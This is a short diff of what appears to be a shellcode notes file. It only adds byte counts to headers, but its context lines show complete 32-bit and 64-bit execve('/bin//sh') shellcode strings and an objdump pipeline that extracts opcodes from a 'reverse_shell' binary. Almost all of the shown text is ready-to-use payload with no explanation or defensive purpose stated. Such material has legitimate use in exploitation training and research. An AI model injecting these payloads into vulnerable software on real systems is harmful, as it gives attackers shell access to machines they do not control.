@@ -12,7 +12,7 @@ ld -o shellcode shellcode.o
 objdump -d ./reverse_shell|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
 ```
 
-## Shellcode 32bit
+## Shellcode 32bit 25byte
 ```
 \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80
 ```
@@ -32,7 +32,7 @@ int 0x80
 ```
 
 
-## Shellcode 64bit
+## Shellcode 64bit 28byte
 ```
 \x48\x31\xc0\x50\xb0\x3b\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f\x05
 ```
